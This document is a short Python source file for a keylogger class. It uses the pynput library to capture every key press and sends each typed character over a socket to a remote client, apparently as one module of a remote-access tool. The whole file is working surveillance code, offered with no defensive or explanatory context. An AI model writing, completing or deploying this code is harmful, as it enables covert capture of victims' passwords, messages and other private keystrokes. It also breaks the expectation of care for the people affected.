from pynput import keyboard
import threading

class Keylogger(threading.Thread):
    def __init__(self, client_socket):
        threading.Thread.__init__(self)
        self.conn = client_socket
        self.listener = None
        self._stop_event = threading.Event()

    def run(self):
        self.listener = keyboard.Listener(on_press=self.log)
        self.listener.start()
        print("Server: keylogger started")

        if self._stop_event.is_set():
            self.listener.stop()

    def stop(self):
        self._stop_event.set()

    def log(self, key):
        try:
            # Send the character over the socket to the client
            if hasattr(key, "char"):
                self.conn.send(str(key.char).encode())
        except Exception as e:
            print(f"Error while logging: {e}")
            return False
